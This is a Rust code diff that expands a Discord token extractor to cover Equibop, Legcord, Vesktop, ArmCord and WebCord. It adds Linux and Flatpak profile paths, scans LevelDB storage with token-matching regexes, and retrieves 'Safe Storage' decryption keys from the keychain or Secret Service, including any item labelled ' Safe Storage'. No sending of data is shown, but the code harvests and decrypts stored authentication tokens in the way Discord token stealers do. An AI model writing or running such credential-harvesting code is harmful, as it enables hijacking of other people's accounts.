@@ -15,11 +15,16 @@ use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_B
 #[cfg(target_os = "macos")]
 use security_framework::passwords::get_generic_password;
 /// Discord client type
-#[derive(Debug)]
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
 enum DiscordClient {
     Stable,
     Canary,
     Ptb,
+    Equibop,
+    Legcord,
+    Vesktop,
+    Armcord,
+    Webcord,
 }
 
 impl DiscordClient {
@@ -29,6 +34,11 @@ impl DiscordClient {
             DiscordClient::Stable => "discord",
             DiscordClient::Canary => "discordcanary",
             DiscordClient::Ptb => "discordptb",
+            DiscordClient::Equibop => "equibop",
+            DiscordClient::Legcord => "legcord",
+            DiscordClient::Vesktop => "vesktop",
+            DiscordClient::Armcord => "armcord",
+            DiscordClient::Webcord => "webcord",
         }
     }
 
@@ -38,6 +48,11 @@ impl DiscordClient {
             DiscordClient::Stable => "discord",
             DiscordClient::Canary => "discordcanary",
             DiscordClient::Ptb => "discordptb",
+            DiscordClient::Equibop => "equibop",
+            DiscordClient::Legcord => "legcord",
+            DiscordClient::Vesktop => "vesktop",
+            DiscordClient::Armcord => "armcord",
+            DiscordClient::Webcord => "webcord",
         }
     }
 
@@ -48,6 +63,11 @@ impl DiscordClient {
             DiscordClient::Stable => "discord Safe Storage",
             DiscordClient::Canary => "discordcanary Safe Storage",
             DiscordClient::Ptb => "discordptb Safe Storage",
+            DiscordClient::Equibop => "equibop Safe Storage",
+            DiscordClient::Legcord => "legcord Safe Storage",
+            DiscordClient::Vesktop => "vesktop Safe Storage",
+            DiscordClient::Armcord => "armcord Safe Storage",
+            DiscordClient::Webcord => "webcord Safe Storage",
         }
     }
 
@@ -57,6 +77,11 @@ impl DiscordClient {
             DiscordClient::Stable => "discord Key",
             DiscordClient::Canary => "discordcanary Key",
             DiscordClient::Ptb => "discordptb Key",
+            DiscordClient::Equibop => "equibop Key",
+            DiscordClient::Legcord => "legcord Key",
+            DiscordClient::Vesktop => "vesktop Key",
+            DiscordClient::Armcord => "armcord Key",
+            DiscordClient::Webcord => "webcord Key",
         }
     }
 
@@ -66,6 +91,11 @@ impl DiscordClient {
             DiscordClient::Stable => "discord",
             DiscordClient::Canary => "discordcanary",
             DiscordClient::Ptb => "discordptb",
+            DiscordClient::Equibop => "equibop",
+            DiscordClient::Legcord => "legcord",
+            DiscordClient::Vesktop => "vesktop",
+            DiscordClient::Armcord => "armcord",
+            DiscordClient::Webcord => "webcord",
         }
     }
 
@@ -75,6 +105,11 @@ impl DiscordClient {
             DiscordClient::Stable => &["discord"],
             DiscordClient::Canary => &["discordcanary"],
             DiscordClient::Ptb => &["discordptb"],
+            DiscordClient::Equibop => &["equibop", "equicord", "discord"],
+            DiscordClient::Legcord => &["legcord", "discord"],
+            DiscordClient::Vesktop => &["vesktop", "discord"],
+            DiscordClient::Armcord => &["armcord", "discord"],
+            DiscordClient::Webcord => &["webcord", "discord"],
         }
     }
 
@@ -84,6 +119,11 @@ impl DiscordClient {
             DiscordClient::Stable => "Discord Stable",
             DiscordClient::Canary => "Discord Canary",
             DiscordClient::Ptb => "Discord PTB",
+            DiscordClient::Equibop => "Equibop",
+            DiscordClient::Legcord => "Legcord",
+            DiscordClient::Vesktop => "Vesktop",
+            DiscordClient::Armcord => "ArmCord",
+            DiscordClient::Webcord => "WebCord",
         }
     }
 }
@@ -165,6 +205,11 @@ pub fn extract_tokens() -> Result<Vec<String>> {
             DiscordClient::Stable,
             DiscordClient::Canary,
             DiscordClient::Ptb,
+            DiscordClient::Equibop,
+            DiscordClient::Legcord,
+            DiscordClient::Vesktop,
+            DiscordClient::Armcord,
+            DiscordClient::Webcord,
         ];
 
         for client in clients {
@@ -582,24 +627,127 @@ fn linux_profile_dirs(client: &DiscordClient) -> Result<Vec<PathBuf>> {
         .context("Could not get HOME environment variable")?;
     let xdg_config_home = std::env::var_os("XDG_CONFIG_HOME").map(PathBuf::from);
     let config_root = linux_config_root(&home, xdg_config_home.as_deref());
-    let profile_name = client.path();
-    let mut paths = vec![config_root.join(profile_name)];
 
-    if matches!(client, DiscordClient::Stable) {
-        paths.push(
-            home.join("snap")
-                .join("discord")
-                .join("current")
-                .join(".config")
-                .join("discord"),
-        );
-        paths.push(
-            home.join(".var")
-                .join("app")
-                .join("com.discordapp.Discord")
-                .join("config")
-                .join("discord"),
-        );
+    let mut paths = Vec::new();
+    match client {
+        DiscordClient::Stable => {
+            paths.push(config_root.join("discord"));
+            paths.push(
+                home.join("snap")
+                    .join("discord")
+                    .join("current")
+                    .join(".config")
+                    .join("discord"),
+            );
+            paths.push(
+                home.join(".var")
+                    .join("app")
+                    .join("com.discordapp.Discord")
+                    .join("config")
+                    .join("discord"),
+            );
+        }
+        DiscordClient::Canary => {
+            paths.push(config_root.join("discordcanary"));
+            paths.push(
+                home.join(".var")
+                    .join("app")
+                    .join("com.discordapp.DiscordCanary")
+                    .join("config")
+                    .join("discordcanary"),
+            );
+        }
+        DiscordClient::Ptb => {
+            paths.push(config_root.join("discordptb"));
+            paths.push(
+                home.join(".var")
+                    .join("app")
+                    .join("com.discordapp.DiscordPTB")
+                    .join("config")
+                    .join("discordptb"),
+            );
+        }
+        DiscordClient::Equibop => {
+            paths.push(config_root.join("equibop"));
+            paths.push(
+                home.join(".var")
+                    .join("app")
+                    .join("org.equicord.equibop")
+                    .join("config")
+                    .join("equibop"),
+            );
+        }
+        DiscordClient::Legcord => {
+            paths.push(config_root.join("Legcord"));
+            paths.push(config_root.join("legcord"));
+            paths.push(
+                home.join(".var")
+                    .join("app")
+                    .join("app.legcord.Legcord")
+                    .join("config")
+                    .join("Legcord"),
+            );
+            paths.push(
+                home.join(".var")
+                    .join("app")
+                    .join("app.legcord.Legcord")
+                    .join("config")
+                    .join("legcord"),
+            );
+            paths.push(
+                home.join(".var")
+                    .join("app")
+                    .join("com.github.Legcord")
+                    .join("config")
+                    .join("Legcord"),
+            );
+        }
+        DiscordClient::Vesktop => {
+            paths.push(config_root.join("vesktop"));
+            paths.push(
+                home.join(".var")
+                    .join("app")
+                    .join("dev.vencord.Vesktop")
+                    .join("config")
+                    .join("vesktop"),
+            );
+        }
+        DiscordClient::Armcord => {
+            paths.push(config_root.join("ArmCord"));
+            paths.push(config_root.join("armcord"));
+            paths.push(
+                home.join(".var")
+                    .join("app")
+                    .join("xyz.armcord.ArmCord")
+                    .join("config")
+                    .join("armcord"),
+            );
+            paths.push(
+                home.join(".var")
+                    .join("app")
+                    .join("xyz.armcord.ArmCord")
+                    .join("config")
+                    .join("ArmCord"),
+            );
+            paths.push(
+                home.join(".var")
+                    .join("app")
+                    .join("com.github.ArmCord.ArmCord")
+                    .join("config")
+                    .join("armcord"),
+            );
+        }
+        DiscordClient::Webcord => {
+            paths.push(config_root.join("WebCord"));
+            paths.push(config_root.join("webcord"));
+            paths.push(
+                home.join(".var")
+                    .join("app")
+                    .join("io.github.spacingbat3.webcord")
+                    .join("config")
+                    .join("WebCord"),
+            );
+        }
     }
 
     Ok(paths)
@@ -621,9 +769,17 @@ fn extract_from_linux_profile(
 ) -> Result<Vec<String>> {
     use crate::logger::{log, LogCategory, LogLevel};
 
-    let leveldb_path = discord_path.join("Local Storage").join("leveldb");
+    let leveldb_candidates = [
+        discord_path.join("Local Storage").join("leveldb"),
+        discord_path.join("sessionData").join("Local Storage").join("leveldb"),
+    ];
 
-    if !leveldb_path.exists() {
+    let valid_leveldb_paths: Vec<_> = leveldb_candidates
+        .into_iter()
+        .filter(|p| p.is_dir())
+        .collect();
+
+    if valid_leveldb_paths.is_empty() {
         anyhow::bail!("LevelDB path does not exist");
     }
 
@@ -631,17 +787,20 @@ fn extract_from_linux_profile(
     let mut encrypted_payloads = Vec::new();
     let mut file_count = 0;
 
-    for entry in fs::read_dir(&leveldb_path)? {
-        let entry = entry?;
-        let path = entry.path();
+    for leveldb_path in valid_leveldb_paths {
+        if let Ok(entries) = fs::read_dir(&leveldb_path) {
+            for entry in entries.flatten() {
+                let path = entry.path();
 
-        if is_leveldb_log_or_table(&path) {
-            file_count += 1;
-            if let Ok(content) = fs::read(&path) {
-                for token in find_plaintext_tokens(&content) {
-                    tokens.insert(token);
+                if is_leveldb_log_or_table(&path) {
+                    file_count += 1;
+                    if let Ok(content) = fs::read(&path) {
+                        for token in find_plaintext_tokens(&content) {
+                            tokens.insert(token);
+                        }
+                        encrypted_payloads.extend(find_encrypted_token_payloads(&content));
+                    }
                 }
-                encrypted_payloads.extend(find_encrypted_token_payloads(&content));
             }
         }
     }
@@ -779,14 +938,14 @@ fn get_linux_safe_storage_password(client: &DiscordClient) -> Result<Vec<u8>> {
             .with_context(|| format!("Could not search Secret Service for {}", application_name))?;
 
         for item in search.unlocked.iter().chain(search.locked.iter()) {
-            if item.is_locked().unwrap_or(false) {
-                item.unlock()
-                    .context("Could not unlock Linux Secret Service item")?;
+            if item.is_locked().unwrap_or(false) && item.unlock().is_err() {
+                continue;
             }
 
             let item_attributes = item.get_attributes().unwrap_or_default();
             let label = item.get_label().unwrap_or_default();
             let looks_like_chromium_safe_storage = label == "Chromium Safe Storage"
+                || label.ends_with(" Safe Storage")
                 || item_attributes
                     .get("xdg:schema")
                     .map(|schema| schema == "chrome_libsecret_os_crypt_password_v2")
@@ -796,11 +955,10 @@ fn get_linux_safe_storage_password(client: &DiscordClient) -> Result<Vec<u8>> {
                 continue;
             }
 
-            let secret = item
-                .get_secret()
-                .context("Could not read Linux safe storage key")?;
-            if !secret.is_empty() {
-                return Ok(secret);
+            if let Ok(secret) = item.get_secret() {
+                if !secret.is_empty() {
+                    return Ok(secret);
+                }
             }
         }
     }
@@ -821,14 +979,17 @@ fn find_and_decrypt_tokens(data: &[u8], master_key: &[u8]) -> Vec<String> {
     tokens
 }
 
+static ENCRYPTED_PAYLOAD_RE: once_cell::sync::Lazy<Option<Regex>> = once_cell::sync::Lazy::new(|| {
+    Regex::new(r"dQw4w9WgXcQ:([A-Za-z0-9+/=]+)").ok()
+});
+
 fn find_encrypted_token_payloads(data: &[u8]) -> Vec<Vec<u8>> {
     let mut payloads = Vec::new();
     let content = String::from_utf8_lossy(data);
 
-    // Pattern: dQw4w9WgXcQ:([Base64])
-    let re = match Regex::new(r"dQw4w9WgXcQ:([A-Za-z0-9+/=]+)") {
-        Ok(re) => re,
-        Err(_) => return payloads,
+    let re = match ENCRYPTED_PAYLOAD_RE.as_ref() {
+        Some(re) => re,
+        None => return payloads,
     };
 
     for cap in re.captures_iter(&content) {
@@ -843,13 +1004,18 @@ fn find_encrypted_token_payloads(data: &[u8]) -> Vec<Vec<u8>> {
 }
 
 #[cfg(target_os = "linux")]
+static PLAINTEXT_TOKEN_RE: once_cell::sync::Lazy<Option<Regex>> = once_cell::sync::Lazy::new(|| {
+    Regex::new(
+        r"(?:mfa\.[A-Za-z0-9_-]{70,}|[A-Za-z0-9_-]{20,30}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{25,120})",
+    ).ok()
+});
+
+#[cfg(target_os = "linux")]
 fn find_plaintext_tokens(data: &[u8]) -> Vec<String> {
     let content = String::from_utf8_lossy(data);
-    let re = match Regex::new(
-        r"(?:mfa\.[A-Za-z0-9_-]{70,}|[A-Za-z0-9_-]{20,30}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{25,120})",
-    ) {
-        Ok(re) => re,
-        Err(_) => return Vec::new(),
+    let re = match PLAINTEXT_TOKEN_RE.as_ref() {
+        Some(re) => re,
+        None => return Vec::new(),
     };
 
     re.find_iter(&content)
